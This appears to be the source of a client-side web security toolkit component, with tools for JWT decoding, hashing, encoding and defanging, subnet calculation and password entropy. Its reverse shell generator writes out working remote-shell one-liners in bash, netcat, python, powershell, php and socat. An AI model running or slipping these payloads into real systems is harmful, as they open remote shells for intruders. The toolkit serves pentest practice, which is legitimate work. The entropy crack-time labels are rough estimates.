"use client";

import { useState, useEffect } from "react";

type ToolType = "jwt" | "hashes" | "encoders" | "subnet" | "revshell" | "entropy" | "passgen" | "cookie" | "hashlookup";

// Lightweight pure JS MD5 helper
function md5(string: string): string {
  function rotateLeft(lValue: number, iShiftBits: number) {
    return (lValue << iShiftBits) | (lValue >>> (32 - iShiftBits));
  }
  function addUnsigned(lX: number, lY: number) {
    const lX4 = lX & 0x40000000;
    const lY4 = lY & 0x40000000;
    const lX8 = lX & 0x80000000;
    const lY8 = lY & 0x80000000;
    const lResult = (lX & 0x3fffffff) + (lY & 0x3fffffff);
    if (lX4 & lY4) return lResult ^ 0x80000000 ^ lX8 ^ lY8;
    if (lX4 | lY4) {
      if (lResult & 0x40000000) return lResult ^ 0xc0000000 ^ lX8 ^ lY8;
      else return lResult ^ 0x40000000 ^ lX8 ^ lY8;
    } else {
      return lResult ^ lX8 ^ lY8;
    }
  }
  function F(x: number, y: number, z: number) { return (x & y) | (~x & z); }
  function G(x: number, y: number, z: number) { return (x & z) | (y & ~z); }
  function H(x: number, y: number, z: number) { return x ^ y ^ z; }
  function I(x: number, y: number, z: number) { return y ^ (x | ~z); }

  function FF(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
    a = addUnsigned(a, addUnsigned(addUnsigned(F(b, c, d), x), ac));
    return addUnsigned(rotateLeft(a, s), b);
  }
  function GG(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
    a = addUnsigned(a, addUnsigned(addUnsigned(G(b, c, d), x), ac));
    return addUnsigned(rotateLeft(a, s), b);
  }
  function HH(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
    a = addUnsigned(a, addUnsigned(addUnsigned(H(b, c, d), x), ac));
    return addUnsigned(rotateLeft(a, s), b);
  }
  function II(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
    a = addUnsigned(a, addUnsigned(addUnsigned(I(b, c, d), x), ac));
    return addUnsigned(rotateLeft(a, s), b);
  }

  function convertToWordArray(str: string) {
    let lWordCount;
    const lMessageLength = str.length;
    const lNumberOfWords_temp1 = lMessageLength + 8;
    const lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64;
    const lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
    const lWordArray = Array(lNumberOfWords - 1);
    let lBytePosition = 0;
    let lByteCount = 0;
    while (lByteCount < lMessageLength) {
      lWordCount = (lByteCount - (lByteCount % 4)) / 4;
      lBytePosition = (lByteCount % 4) * 8;
      lWordArray[lWordCount] = (lWordArray[lWordCount] | (str.charCodeAt(lByteCount) << lBytePosition));
      lByteCount++;
    }
    lWordCount = (lByteCount - (lByteCount % 4)) / 4;
    lBytePosition = (lByteCount % 4) * 8;
    lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 << lBytePosition);
    lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
    lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
    return lWordArray;
  }

  function wordToHex(lValue: number) {
    let WordToHexValue = "", WordToHexValue_temp = "", lByte, lCount;
    for (lCount = 0; lCount <= 3; lCount++) {
      lByte = (lValue >>> (lCount * 8)) & 255;
      WordToHexValue_temp = "0" + lByte.toString(16);
      WordToHexValue = WordToHexValue + WordToHexValue_temp.substring(WordToHexValue_temp.length - 2, WordToHexValue_temp.length);
    }
    return WordToHexValue;
  }

  const x = convertToWordArray(string);
  let a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;
  const S11 = 7, S12 = 12, S13 = 17, S14 = 22;
  const S21 = 5, S22 = 9, S23 = 14, S24 = 20;
  const S31 = 4, S32 = 11, S33 = 16, S34 = 23;
  const S41 = 6, S42 = 10, S43 = 15, S44 = 21;

  for (let k = 0; k < x.length; k += 16) {
    const AA = a, BB = b, CC = c, DD = d;
    a = FF(a, b, c, d, x[k + 0], S11, 0xd76aa478);
    d = FF(d, a, b, c, x[k + 1], S12, 0xe8c7b756);
    c = FF(c, d, a, b, x[k + 2], S13, 0x242070db);
    b = FF(b, c, d, a, x[k + 3], S14, 0xc1bdceee);
    a = FF(a, b, c, d, x[k + 4], S11, 0xf57c0faf);
    d = FF(d, a, b, c, x[k + 5], S12, 0x4787c62a);
    c = FF(c, d, a, b, x[k + 6], S13, 0xa8304613);
    b = FF(b, c, d, a, x[k + 7], S14, 0xfd469501);
    a = FF(a, b, c, d, x[k + 8], S11, 0x698098d8);
    d = FF(d, a, b, c, x[k + 9], S12, 0x8b44f7af);
    c = FF(c, d, a, b, x[k + 10], S13, 0xffff5bb1);
    b = FF(b, c, d, a, x[k + 11], S14, 0x895cd7be);
    a = FF(a, b, c, d, x[k + 12], S11, 0x6b901122);
    d = FF(d, a, b, c, x[k + 13], S12, 0xfd987193);
    c = FF(c, d, a, b, x[k + 14], S13, 0xa679438e);
    b = FF(b, c, d, a, x[k + 15], S14, 0x49b40821);

    a = GG(a, b, c, d, x[k + 1], S21, 0xf61e2562);
    d = GG(d, a, b, c, x[k + 6], S22, 0xc040b340);
    c = GG(c, d, a, b, x[k + 11], S23, 0x265e5a51);
    b = GG(b, c, d, a, x[k + 0], S24, 0xe9b6c7aa);
    a = GG(a, b, c, d, x[k + 5], S21, 0xd62f105d);
    d = GG(d, a, b, c, x[k + 10], S22, 0x02441453);
    c = GG(c, d, a, b, x[k + 15], S23, 0xd8a1e681);
    b = GG(b, c, d, a, x[k + 4], S24, 0xe7d3fbc8);
    a = GG(a, b, c, d, x[k + 9], S21, 0x21e1cde6);
    d = GG(d, a, b, c, x[k + 14], S22, 0xc33707d6);
    c = GG(c, d, a, b, x[k + 3], S23, 0xf4d50d87);
    b = GG(b, c, d, a, x[k + 8], S24, 0x455a14ed);
    a = GG(a, b, c, d, x[k + 13], S21, 0xa9e3e905);
    d = GG(d, a, b, c, x[k + 2], S22, 0xfcefa3f8);
    c = GG(c, d, a, b, x[k + 7], S23, 0x676f02d9);
    b = GG(b, c, d, a, x[k + 12], S24, 0x8d2a4c8a);

    a = HH(a, b, c, d, x[k + 5], S31, 0xfffa3942);
    d = HH(d, a, b, c, x[k + 8], S32, 0x8771f681);
    c = HH(c, d, a, b, x[k + 11], S33, 0x6d9d6122);
    b = HH(b, c, d, a, x[k + 14], S34, 0xfde5380c);
    a = HH(a, b, c, d, x[k + 1], S31, 0xa4beea44);
    d = HH(d, a, b, c, x[k + 4], S32, 0x4bdecfa9);
    c = HH(c, d, a, b, x[k + 7], S33, 0xf6bb4b60);
    b = HH(b, c, d, a, x[k + 10], S34, 0xbebfbc70);
    a = HH(a, b, c, d, x[k + 13], S31, 0x289b7ec6);
    d = HH(d, a, b, c, x[k + 0], S32, 0xeaa127fa);
    c = HH(c, d, a, b, x[k + 3], S33, 0xd4ef3085);
    b = HH(b, c, d, a, x[k + 6], S34, 0x04881d05);
    a = HH(a, b, c, d, x[k + 9], S31, 0xd9d4d039);
    d = HH(d, a, b, c, x[k + 12], S32, 0xe6db99e5);
    c = HH(c, d, a, b, x[k + 15], S33, 0x1fa27cf8);
    b = HH(b, c, d, a, x[k + 2], S34, 0xc4ac5665);

    a = II(a, b, c, d, x[k + 0], S41, 0xf4292244);
    d = II(d, a, b, c, x[k + 7], S42, 0x432aff97);
    c = II(c, d, a, b, x[k + 14], S43, 0xab9423a7);
    b = II(b, c, d, a, x[k + 5], S44, 0xfc93a039);
    a = II(a, b, c, d, x[k + 12], S41, 0x655b59c3);
    d = II(d, a, b, c, x[k + 3], S42, 0x8f0ccc92);
    c = II(c, d, a, b, x[k + 10], S43, 0xffeff47d);
    b = II(b, c, d, a, x[k + 1], S44, 0x85845dd1);
    a = II(a, b, c, d, x[k + 8], S41, 0x6fa87e4f);
    d = II(d, a, b, c, x[k + 15], S42, 0xfe2ce6e0);
    c = II(c, d, a, b, x[k + 6], S43, 0xa3014314);
    b = II(b, c, d, a, x[k + 13], S44, 0x4e0811a1);
    a = II(a, b, c, d, x[k + 4], S41, 0xf7537e82);
    d = II(d, a, b, c, x[k + 11], S42, 0xbd3af235);
    c = II(c, d, a, b, x[k + 2], S43, 0x2ad7d2bb);
    b = II(b, c, d, a, x[k + 9], S44, 0xeb86d391);

    a = addUnsigned(a, AA);
    b = addUnsigned(b, BB);
    c = addUnsigned(c, CC);
    d = addUnsigned(d, DD);
  }
  return (wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d)).toLowerCase();
}

async function computeHash(algo: string, text: string): Promise<string> {
  if (!text) return "";
  if (algo === "MD5") return md5(text);
  const msgUint8 = new TextEncoder().encode(text);
  const hashBuffer = await crypto.subtle.digest(algo, msgUint8);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
}

export default function SecurityToolkit() {
  const [activeTool, setActiveTool] = useState<ToolType>("jwt");
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // 1. JWT state
  const [jwtInput, setJwtInput] = useState("");
  const [jwtOutput, setJwtOutput] = useState<{ header: any; payload: any; valid: boolean; expStatus: string } | null>(null);

  const handleJwtDecode = (token: string) => {
    setJwtInput(token);
    if (!token.trim()) { setJwtOutput(null); return; }
    try {
      const parts = token.trim().split(".");
      if (parts.length < 2) throw new Error("Invalid JWT format (needs header.payload.signature)");
      const base64UrlDecode = (str: string) => {
        let base64 = str.replace(/-/g, "+").replace(/_/g, "/");
        while (base64.length % 4) base64 += "=";
        return decodeURIComponent(
          atob(base64)
            .split("")
            .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
            .join("")
        );
      };
      const header = JSON.parse(base64UrlDecode(parts[0]));
      const payload = JSON.parse(base64UrlDecode(parts[1]));

      let expStatus = "No Expiry (exp claim missing)";
      if (payload.exp) {
        const expTime = payload.exp * 1000;
        const now = Date.now();
        expStatus = expTime < now ? `EXPIRED (${new Date(expTime).toISOString()})` : `VALID (expires ${new Date(expTime).toISOString()})`;
      }

      setJwtOutput({ header, payload, valid: true, expStatus });
    } catch (e: any) {
      setJwtOutput({ header: { error: e.message }, payload: {}, valid: false, expStatus: "Invalid Token" });
    }
  };

  // 2. Hash & Identifier state
  const [hashInput, setHashInput] = useState("");
  const [hashes, setHashes] = useState<{ [algo: string]: string }>({});
  const [identifiedHash, setIdentifiedHash] = useState<string | null>(null);

  useEffect(() => {
    if (!hashInput) {
      setHashes({});
      setIdentifiedHash(null);
      return;
    }
    const trimmed = hashInput.trim();
    // Identifier check
    if (/^[a-fA-F0-9]{32}$/.test(trimmed)) setIdentifiedHash("MD5 / NTLM Hash (128-bit)");
    else if (/^[a-fA-F0-9]{40}$/.test(trimmed)) setIdentifiedHash("SHA-1 / RIPEMD-160 (160-bit)");
    else if (/^[a-fA-F0-9]{64}$/.test(trimmed)) setIdentifiedHash("SHA-256 / SHA3-256 (256-bit)");
    else if (/^[a-fA-F0-9]{96}$/.test(trimmed)) setIdentifiedHash("SHA-384 (384-bit)");
    else if (/^[a-fA-F0-9]{128}$/.test(trimmed)) setIdentifiedHash("SHA-512 / Whirlpool (512-bit)");
    else if (/^\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}$/.test(trimmed)) setIdentifiedHash("bcrypt Password Hash");
    else if (/^\$argon2[id]?\$/.test(trimmed)) setIdentifiedHash("Argon2 Key Derivation Hash");
    else if (/^\$6\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}$/.test(trimmed)) setIdentifiedHash("SHA-512 Unix Crypt ($6$)");
    else setIdentifiedHash(null);

    // Compute active hashes for string
    Promise.all([
      computeHash("MD5", hashInput),
      computeHash("SHA-1", hashInput),
      computeHash("SHA-256", hashInput),
      computeHash("SHA-384", hashInput),
      computeHash("SHA-512", hashInput),
    ]).then(([md5h, sha1h, sha256h, sha384h, sha512h]) => {
      setHashes({
        MD5: md5h,
        "SHA-1": sha1h,
        "SHA-256": sha256h,
        "SHA-384": sha384h,
        "SHA-512": sha512h,
      });
    });
  }, [hashInput]);

  // 3. Encoder / Defanger state
  const [encInput, setEncInput] = useState("");
  const [encMode, setEncMode] = useState<
    "b64encode" | "b64decode" | "urlencode" | "urldecode" | "defang" | "refang" | "hexencode" | "hexdecode" | "rot13"
  >("defang");

  const getEncoderOutput = () => {
    if (!encInput) return "";
    try {
      if (encMode === "b64encode") return btoa(unescape(encodeURIComponent(encInput)));
      if (encMode === "b64decode") return decodeURIComponent(escape(atob(encInput)));
      if (encMode === "urlencode") return encodeURIComponent(encInput);
      if (encMode === "urldecode") return decodeURIComponent(encInput);
      if (encMode === "defang") {
        return encInput
          .replace(/https:\/\//gi, "hxxps://")
          .replace(/http:\/\//gi, "hxxp://")
          .replace(/\./g, "[.]")
          .replace(/@/g, "[at]");
      }
      if (encMode === "refang") {
        return encInput
          .replace(/hxxps:\/\//gi, "https://")
          .replace(/hxxp:\/\//gi, "http://")
          .replace(/\[\.\]/g, ".")
          .replace(/\[dot\]/gi, ".")
          .replace(/\[at\]/gi, "@");
      }
      if (encMode === "hexencode") {
        return Array.from(new TextEncoder().encode(encInput))
          .map((b) => b.toString(16).padStart(2, "0"))
          .join(" ");
      }
      if (encMode === "hexdecode") {
        const cleaned = encInput.replace(/[^0-9a-fA-F]/g, "");
        if (cleaned.length % 2 !== 0) throw new Error("Invalid hex string length");
        const bytes = [];
        for (let i = 0; i < cleaned.length; i += 2) {
          bytes.push(parseInt(cleaned.substr(i, 2), 16));
        }
        return new TextDecoder().decode(new Uint8Array(bytes));
      }
      if (encMode === "rot13") {
        return encInput.replace(/[a-zA-Z]/g, (c) => {
          const code = c.charCodeAt(0);
          const base = code >= 97 ? 97 : 65;
          return String.fromCharCode(((code - base + 13) % 26) + base);
        });
      }
    } catch (e: any) {
      return `Error: ${e.message}`;
    }
    return "";
  };

  // 4. Subnet Calculator state
  const [cidrInput, setCidrInput] = useState("192.168.1.0/24");
  const calculateSubnet = (cidr: string) => {
    try {
      const parts = cidr.trim().split("/");
      if (parts.length !== 2) return null;
      const ipStr = parts[0];
      const prefix = parseInt(parts[1], 10);
      if (isNaN(prefix) || prefix < 0 || prefix > 32) return null;

      const ipOctets = ipStr.split(".").map(Number);
      if (ipOctets.length !== 4 || ipOctets.some((o) => isNaN(o) || o < 0 || o > 255)) return null;

      const ipNum = ((ipOctets[0] << 24) >>> 0) + ((ipOctets[1] << 16) >>> 0) + ((ipOctets[2] << 8) >>> 0) + (ipOctets[3] >>> 0);
      const maskNum = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
      const wildcardNum = ~maskNum >>> 0;
      const netNum = (ipNum & maskNum) >>> 0;
      const bcastNum = (netNum | wildcardNum) >>> 0;

      const numToIp = (n: number) => [((n >>> 24) & 255), ((n >>> 16) & 255), ((n >>> 8) & 255), (n & 255)].join(".");
      const numToBin = (n: number) => [
        ((n >>> 24) & 255).toString(2).padStart(8, "0"),
        ((n >>> 16) & 255).toString(2).padStart(8, "0"),
        ((n >>> 8) & 255).toString(2).padStart(8, "0"),
        (n & 255).toString(2).padStart(8, "0"),
      ].join(".");

      const totalHosts = Math.pow(2, 32 - prefix);
      const usableHosts = prefix >= 31 ? (prefix === 31 ? 2 : 1) : totalHosts - 2;
      const firstHost = prefix >= 31 ? numToIp(netNum) : numToIp(netNum + 1);
      const lastHost = prefix >= 31 ? numToIp(bcastNum) : numToIp(bcastNum - 1);

      let ipClass = "Class A (Private)";
      if (ipOctets[0] < 128) ipClass = ipOctets[0] === 10 ? "Class A (Private RFC1918)" : "Class A (Public)";
      else if (ipOctets[0] < 192) ipClass = ipOctets[0] === 172 && ipOctets[1] >= 16 && ipOctets[1] <= 31 ? "Class B (Private RFC1918)" : "Class B (Public)";
      else if (ipOctets[0] < 224) ipClass = ipOctets[0] === 192 && ipOctets[1] === 168 ? "Class C (Private RFC1918)" : "Class C (Public)";
      else if (ipOctets[0] < 240) ipClass = "Class D (Multicast)";
      else ipClass = "Class E (Reserved)";

      return {
        ip: ipStr,
        prefix,
        netmask: numToIp(maskNum),
        wildcard: numToIp(wildcardNum),
        network: numToIp(netNum),
        broadcast: numToIp(bcastNum),
        firstHost,
        lastHost,
        totalHosts: totalHosts.toLocaleString(),
        usableHosts: usableHosts.toLocaleString(),
        ipClass,
        binaryMask: numToBin(maskNum),
      };
    } catch {
      return null;
    }
  };
  const subnetResult = calculateSubnet(cidrInput);

  // 5. Reverse Shell Generator state
  const [shellIp, setShellIp] = useState("10.10.14.5");
  const [shellPort, setShellPort] = useState("4444");
  const [shellType, setShellType] = useState<"bash" | "bash_b64" | "nc_mkfifo" | "python" | "powershell" | "php" | "socat">("bash");

  const getShellPayload = () => {
    const ip = shellIp.trim() || "10.10.14.5";
    const port = shellPort.trim() || "4444";

    if (shellType === "bash") return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    if (shellType === "bash_b64") {
      const raw = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
      return `echo "${btoa(raw)}" | base64 -d | bash`;
    }
    if (shellType === "nc_mkfifo") return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
    if (shellType === "python") return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
    if (shellType === "powershell") return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    if (shellType === "php") return `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    if (shellType === "socat") return `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`;
    return "";
  };

  // 6. Password Entropy & Strength state
  const [pwInput, setPwInput] = useState("");
  const computeEntropy = (str: string) => {
    if (!str) return null;
    let poolSize = 0;
    if (/[a-z]/.test(str)) poolSize += 26;
    if (/[A-Z]/.test(str)) poolSize += 26;
    if (/[0-9]/.test(str)) poolSize += 10;
    if (/[^a-zA-Z0-9]/.test(str)) poolSize += 33;
    if (poolSize === 0) poolSize = 1;

    const entropy = Math.round(str.length * Math.log2(poolSize));
    let strength = "Very Weak";
    let color = "rose";
    let crackTime = "< 1 millisecond";

    if (entropy > 80) {
      strength = "Military / Vault Grade";
      color = "emerald";
      crackTime = "Trillions of Years";
    } else if (entropy > 60) {
      strength = "Strong";
      color = "cyan-signal";
      crackTime = "Hundreds of Years";
    } else if (entropy > 45) {
      strength = "Moderate";
      color = "amber";
      crackTime = "Several Days to Months";
    } else {
      crackTime = "Seconds to Minutes";
    }

    return {
      entropy,
      strength,
      color,
      crackTime,
      poolSize,
      hasLower: /[a-z]/.test(str),
      hasUpper: /[A-Z]/.test(str),
      hasNumber: /[0-9]/.test(str),
      hasSymbol: /[^a-zA-Z0-9]/.test(str),
      length: str.length,
    };
  };
  const entropyResult = computeEntropy(pwInput);

  return (
    <div className="w-full max-w-4xl space-y-5 animate-fadeIn">
      {/* Main Toolkit Container */}
      <div className="bg-panel border border-panelBorder rounded-2xl p-6 shadow-xl space-y-5">
        <div className="flex items-start justify-between gap-3 flex-wrap">
          <div>
            <div className="flex items-center gap-2 mb-1.5">
              <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-violet-500/20 text-violet-300 border border-violet-500/30">
                100% ZERO-LATENCY • CLIENT-SIDE
              </span>
            </div>
            <h2 className="font-display text-xl font-bold text-white flex items-center gap-2">
              🛠️ Cyber Security Swiss-Army Toolkit
            </h2>
            <p className="text-xs text-mist font-mono mt-1 max-w-xl">
              Essential offensive & defensive utility suite: JWT Inspector, Cryptographic Hashes, Cyber Defanger/Encoder, Subnet Calculator, Reverse Shell Generator, and Password Entropy.
            </p>
          </div>

          {/* Navigation Tabs */}
          <div className="flex bg-void border border-panelBorder rounded-xl p-1 gap-1 overflow-x-auto max-w-full">
            {([
              { key: "jwt",        label: "🔑 JWT" },
              { key: "hashes",     label: "⚡ Hashes" },
              { key: "encoders",   label: "🔤 Defanger / Encoders" },
              { key: "subnet",     label: "🌐 Subnet / CIDR" },
              { key: "revshell",   label: "🐚 Shells" },
              { key: "entropy",    label: "🛡️ Entropy" },
              { key: "passgen",    label: "🎲 Pass Generator" },
              { key: "cookie",     label: "🍪 Cookie Audit" },
              { key: "hashlookup", label: "🔍 Hash Identifier" },
            ] as const).map((t) => (
              <button
                key={t.key}
                onClick={() => setActiveTool(t.key)}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-semibold transition whitespace-nowrap ${
                  activeTool === t.key
                    ? "bg-cyan-signal text-void shadow-sm"
                    : "text-mist hover:text-white"
                }`}
              >
                {t.label}
              </button>
            ))}
          </div>
        </div>

        {/* 1. JWT TOOL */}
        {activeTool === "jwt" && (
          <div className="space-y-4 pt-2">
            <textarea
              rows={4}
              placeholder="Paste raw JWT (eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...)"
              value={jwtInput}
              onChange={(e) => handleJwtDecode(e.target.value)}
              className="w-full px-4 py-3 bg-void border border-panelBorder rounded-xl text-white font-mono text-xs focus:outline-none focus:border-cyan-signal/60 leading-relaxed resize-none transition placeholder:text-mist/25 break-all"
            />

            {jwtOutput && (
              <div className="space-y-3 animate-slideUp">
                <div
                  className={`p-3 rounded-xl border font-mono text-xs flex justify-between items-center ${
                    jwtOutput.valid
                      ? jwtOutput.expStatus.includes("EXPIRED")
                        ? "bg-amber-500/10 border-amber-500/30 text-amber-300"
                        : "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"
                      : "bg-rose-500/10 border-rose-500/30 text-rose-400"
                  }`}
                >
                  <span>{jwtOutput.expStatus}</span>
                  <span className="font-bold">{jwtOutput.valid ? "DECODED ✓" : "INVALID FORMAT ⚠️"}</span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="bg-void/70 border border-panelBorder/60 rounded-xl p-4 space-y-2">
                    <span className="text-[10px] font-mono text-cyan-signal uppercase tracking-widest block font-bold">
                      HEADER (Algorithm & Type)
                    </span>
                    <pre className="text-xs font-mono text-white/90 overflow-x-auto whitespace-pre-wrap">
                      {JSON.stringify(jwtOutput.header, null, 2)}
                    </pre>
                  </div>

                  <div className="bg-void/70 border border-panelBorder/60 rounded-xl p-4 space-y-2">
                    <span className="text-[10px] font-mono text-purple-300 uppercase tracking-widest block font-bold">
                      PAYLOAD (Claims & Subject)
                    </span>
                    <pre className="text-xs font-mono text-white/90 overflow-x-auto whitespace-pre-wrap">
                      {JSON.stringify(jwtOutput.payload, null, 2)}
                    </pre>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* 2. REAL CRYPTO HASHES & IDENTIFIER */}
        {activeTool === "hashes" && (
          <div className="space-y-4 pt-2">
            <div>
              <label className="block text-xs font-mono text-mist mb-1.5">Input Text or Hash to Compute / Identify:</label>
              <input
                type="text"
                placeholder="Enter string to hash or paste a hash to auto-identify..."
                value={hashInput}
                onChange={(e) => setHashInput(e.target.value)}
                className="w-full bg-void border border-panelBorder rounded-xl px-4 py-3 text-sm font-mono text-white placeholder:text-mist/30 focus:outline-none focus:border-cyan-signal/60 transition"
              />
            </div>

            {identifiedHash && (
              <div className="p-3 bg-cyan-signal/10 border border-cyan-signal/30 rounded-xl flex items-center justify-between font-mono text-xs text-cyan-signal animate-slideUp">
                <span className="font-bold flex items-center gap-2">🔍 Detected Hash Format:</span>
                <span className="font-bold bg-cyan-signal text-void px-2 py-0.5 rounded text-[11px]">
                  {identifiedHash}
                </span>
              </div>
            )}

            {hashInput && (
              <div className="space-y-2.5 font-mono text-xs animate-slideUp">
                {Object.entries(hashes).map(([algo, hashVal]) => (
                  <div
                    key={algo}
                    className="flex flex-col sm:flex-row sm:items-center justify-between bg-void/70 p-3 rounded-xl border border-panelBorder/60 gap-2 hover:border-cyan-signal/40 transition"
                  >
                    <span className="text-mist font-bold text-[11px] w-20 shrink-0">{algo}</span>
                    <span className="text-white/90 break-all select-all text-xs font-mono flex-1">
                      {hashVal}
                    </span>
                    <button
                      onClick={() => copyToClipboard(hashVal, algo)}
                      className="px-2.5 py-1 bg-panel border border-panelBorder text-[10px] text-cyan-signal hover:bg-cyan-signal hover:text-void rounded transition self-end sm:self-center shrink-0 font-bold"
                    >
                      {copiedKey === algo ? "COPIED ✓" : "COPY"}
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* 3. DEFANGER & ENCODERS */}
        {activeTool === "encoders" && (
          <div className="space-y-4 pt-2">
            <div className="flex gap-1.5 flex-wrap text-xs font-mono">
              {([
                { key: "defang",    label: "🛡️ Cyber Defang (IOC)" },
                { key: "refang",    label: "🔓 Refang" },
                { key: "b64encode", label: "Base64 Enc" },
                { key: "b64decode", label: "Base64 Dec" },
                { key: "urlencode", label: "URL Enc" },
                { key: "urldecode", label: "URL Dec" },
                { key: "hexencode", label: "Hex Enc" },
                { key: "hexdecode", label: "Hex Dec" },
                { key: "rot13",     label: "Rot13" },
              ] as const).map((m) => (
                <button
                  key={m.key}
                  onClick={() => setEncMode(m.key)}
                  className={`px-3 py-1 rounded-lg border transition ${
                    encMode === m.key
                      ? "bg-cyan-signal/20 text-cyan-signal border-cyan-signal/50 font-bold"
                      : "bg-void border-panelBorder text-mist hover:text-white"
                  }`}
                >
                  {m.label}
                </button>
              ))}
            </div>

            <textarea
              rows={3}
              placeholder={encMode === "defang" ? "Enter malicious URL/IP to defang (e.g. https://evil.com/payload.exe)" : "Enter text..."}
              value={encInput}
              onChange={(e) => setEncInput(e.target.value)}
              className="w-full px-4 py-3 bg-void border border-panelBorder rounded-xl text-white font-mono text-xs focus:outline-none focus:border-cyan-signal/60 leading-relaxed resize-none transition"
            />

            {encInput && (
              <div className="bg-void/80 border border-panelBorder/60 rounded-xl p-4 space-y-2 animate-slideUp">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-mono text-mist uppercase tracking-widest block font-bold">
                    PROCESSED RESULT
                  </span>
                  <button
                    onClick={() => copyToClipboard(getEncoderOutput(), "encoder_res")}
                    className="px-2.5 py-1 bg-panel border border-panelBorder text-[10px] text-cyan-signal hover:bg-cyan-signal hover:text-void rounded transition font-bold"
                  >
                    {copiedKey === "encoder_res" ? "COPIED ✓" : "COPY OUTPUT"}
                  </button>
                </div>
                <div className="text-xs font-mono text-cyan-signal break-all select-all font-semibold bg-panel/50 p-3 rounded-lg border border-panelBorder">
                  {getEncoderOutput()}
                </div>
              </div>
            )}
          </div>
        )}

        {/* 4. SUBNET / CIDR CALCULATOR */}
        {activeTool === "subnet" && (
          <div className="space-y-4 pt-2">
            <div>
              <label className="block text-xs font-mono text-mist mb-1.5">Enter IPv4 Address with CIDR Prefix:</label>
              <input
                type="text"
                placeholder="192.168.1.50/24 or 10.0.0.0/16..."
                value={cidrInput}
                onChange={(e) => setCidrInput(e.target.value)}
                className="w-full bg-void border border-panelBorder rounded-xl px-4 py-3 text-sm font-mono text-white placeholder:text-mist/30 focus:outline-none focus:border-cyan-signal/60 transition"
              />
            </div>

            {subnetResult ? (
              <div className="space-y-3 font-mono text-xs animate-slideUp">
                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-3">
                  {[
                    ["Network Address", subnetResult.network],
                    ["Broadcast Address", subnetResult.broadcast],
                    ["Netmask", subnetResult.netmask],
                    ["Wildcard Mask", subnetResult.wildcard],
                    ["First Usable Host", subnetResult.firstHost],
                    ["Last Usable Host", subnetResult.lastHost],
                    ["Usable Hosts", subnetResult.usableHosts],
                    ["Total Addresses", subnetResult.totalHosts],
                    ["IP Classification", subnetResult.ipClass],
                  ].map(([label, val]) => (
                    <div key={label} className="bg-void/70 p-3 rounded-xl border border-panelBorder/60 space-y-1">
                      <span className="text-[10px] text-mist uppercase tracking-wider block">{label}</span>
                      <span className="text-white font-bold text-xs select-all">{val}</span>
                    </div>
                  ))}
                </div>
                <div className="bg-void/70 p-3 rounded-xl border border-panelBorder/60 space-y-1">
                  <span className="text-[10px] text-mist uppercase tracking-wider block">Binary Subnet Mask</span>
                  <span className="text-cyan-signal font-mono text-xs select-all">{subnetResult.binaryMask}</span>
                </div>
              </div>
            ) : (
              <div className="p-4 bg-rose-500/10 border border-rose-500/30 rounded-xl text-rose-400 font-mono text-xs">
                Invalid CIDR format. Please enter an IP with a prefix between /0 and /32 (e.g. 192.168.1.0/24).
              </div>
            )}
          </div>
        )}

        {/* 5. REVERSE SHELL GENERATOR */}
        {activeTool === "revshell" && (
          <div className="space-y-4 pt-2">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="block text-xs font-mono text-mist mb-1">Target Listener IP (LHOST):</label>
                <input
                  type="text"
                  placeholder="10.10.14.5"
                  value={shellIp}
                  onChange={(e) => setShellIp(e.target.value)}
                  className="w-full bg-void border border-panelBorder rounded-xl px-4 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-cyan-signal/60 transition"
                />
              </div>
              <div>
